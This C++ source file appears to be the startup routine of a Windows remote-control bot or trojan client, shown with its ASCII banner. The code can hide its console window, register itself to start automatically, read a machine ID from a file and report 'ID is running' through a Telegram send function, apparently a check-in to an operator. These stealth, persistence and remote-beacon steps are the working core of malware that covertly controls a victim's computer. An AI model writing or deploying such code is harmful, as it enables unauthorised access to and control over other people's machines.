#include <iostream>
#include <fstream>
#include <Windows.h>
#include "startup.h"
#include "constant.h"
#include "telegram.h"
#include "autostart.h"

void logo() {
	std::cout << "      _                   _      ____  " << std::endl
		<< "     | |                 (_)    |___ \\ " << std::endl
		<< "   __| |_   _ _ __  _ __  ___  __ __) |" << std::endl
		<< "  / _` | | | | '_ \\| '_ \\| \\ \\/ /|__ < " << std::endl
		<< " | (_| | |_| | |_) | | | | |>  < ___) |" << std::endl
		<< "  \\__,_|\\__,_| .__/|_| |_|_/_/\\_\\____/  " << std::endl
		<< "             | |  " << VERSION << std::endl
		<< "             |_|                       ";
}

void startup() {
	if (HIDE_TERMINAL)
		ShowWindow(::GetConsoleWindow(), SW_HIDE);
	if (AUTOSTART)
		autostart();

	logo();

	std::fstream file;
	file.open("ID.id");
	file >> ID;
	file.close();

	if (ID.empty())
		ID = "X";

	telegram::Send(ID + " is running");
	std::cout << "ID: " + ID << std::endl;
}
